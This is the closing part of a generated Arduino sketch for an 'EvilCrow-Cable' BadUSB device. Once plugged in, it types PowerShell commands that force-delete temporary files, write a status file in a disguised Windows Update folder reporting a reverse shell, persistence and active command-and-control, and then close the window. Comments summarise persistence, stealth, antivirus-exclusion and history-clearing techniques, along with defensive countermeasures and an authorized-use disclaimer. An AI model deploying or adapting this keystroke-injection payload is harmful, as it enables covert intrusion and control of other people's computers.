  // EvilCrow-Cable Command: STRING Remove-Item "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
  DigiKeyboard.print("Remove-Item "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # SECTION 13: COMPLETION AND STATUS

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # Create status report

  // EvilCrow-Cable Command: STRING `$status = @{ 'initial_access' = 'completed'; 'reverse_shell' = 'established'; 'persistence' = 'configured'; 'c2' = 'active'; 'timestamp' = (Get-Date).ToString() }
  DigiKeyboard.print("`$status = @{ 'initial_access' = 'completed'; 'reverse_shell' = 'established'; 'persistence' = 'configured'; 'c2' = 'active'; 'timestamp' = (Get-Date).ToString() }");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: STRING `$status | ConvertTo-Json | Out-File "$env:APPDATA\Microsoft\Windows\Update\status.json" -Force
  DigiKeyboard.print("`$status | ConvertTo-Json | Out-File "$env:APPDATA\Microsoft\Windows\Update\status.json" -Force");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: DELAY 100
  DigiKeyboard.delay(100);  // EvilCrow-Cable delay: 100ms

  // EvilCrow-Cable Command: # Final cleanup - close PowerShell window

  // EvilCrow-Cable Command: STRING exit
  DigiKeyboard.print("exit");  // EvilCrow-Cable string input

  // EvilCrow-Cable Command: ENTER
  DigiKeyboard.sendKeyPress(KEY_ENTER);  // EvilCrow-Cable key press: ENTER

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # EDUCATIONAL NOTES - RED TEAM PERSPECTIVE

  // EvilCrow-Cable Command: # ========================================

  // EvilCrow-Cable Command: # This demonstration shows realistic red team techniques:

  // EvilCrow-Cable Command: #

  // EvilCrow-Cable Command: # 1. RAPID INITIAL ACCESS:

  // EvilCrow-Cable Command: #    - HID devices bypass most security measures

  // EvilCrow-Cable Command: #    - Physical access is often the weakest link

  // EvilCrow-Cable Command: #    - Automation reduces detection time

  // EvilCrow-Cable Command: #

  // EvilCrow-Cable Command: # 2. PERSISTENCE MECHANISMS:

  // EvilCrow-Cable Command: #    - Registry modifications for startup persistence

  // EvilCrow-Cable Command: #    - Scheduled tasks for additional persistence

  // EvilCrow-Cable Command: #    - Multiple fallback mechanisms

  // EvilCrow-Cable Command: #

  // EvilCrow-Cable Command: # 3. STEALTH OPERATIONS:

  // EvilCrow-Cable Command: #    - Hidden windows and processes

  // EvilCrow-Cable Command: #    - Covert file locations

  // EvilCrow-Cable Command: #    - Minimal system impact

  // EvilCrow-Cable Command: #

  // EvilCrow-Cable Command: # 4. COMMAND & CONTROL:

  // EvilCrow-Cable Command: #    - Reverse shell establishment

  // EvilCrow-Cable Command: #    - Multiple communication channels

  // EvilCrow-Cable Command: #    - Fallback mechanisms

  // EvilCrow-Cable Command: #

  // EvilCrow-Cable Command: # 5. DEFENSIVE EVASION:

  // EvilCrow-Cable Command: #    - Antivirus exclusions

  // EvilCrow-Cable Command: #    - History clearing

  // EvilCrow-Cable Command: #    - Process hiding

  // EvilCrow-Cable Command: #

  // EvilCrow-Cable Command: # DEFENSIVE MEASURES TO COUNTER:

  // EvilCrow-Cable Command: # - Physical security controls

  // EvilCrow-Cable Command: # - USB port restrictions

  // EvilCrow-Cable Command: # - Process monitoring

  // EvilCrow-Cable Command: # - Network traffic analysis

  // EvilCrow-Cable Command: # - Registry monitoring

  // EvilCrow-Cable Command: # - Scheduled task monitoring

  // EvilCrow-Cable Command: # - Antivirus exclusions monitoring

  // EvilCrow-Cable Command: #

  // EvilCrow-Cable Command: # REMEMBER: This is for EDUCATIONAL and AUTHORIZED TESTING ONLY

  // EvilCrow-Cable Command: # Always obtain proper authorization before any security testing

  // End of Happy Frog payload
}

/*
End of Happy Frog Production Code for EvilCrow-Cable

Production Notes:
- This code runs immediately on device boot
- Optimized for WiFi-enabled BadUSB attacks
- Stealth design and compact form factor
- Use only for authorized testing and education

For more information, visit: https://github.com/ZeroDumb/happy-frog
*/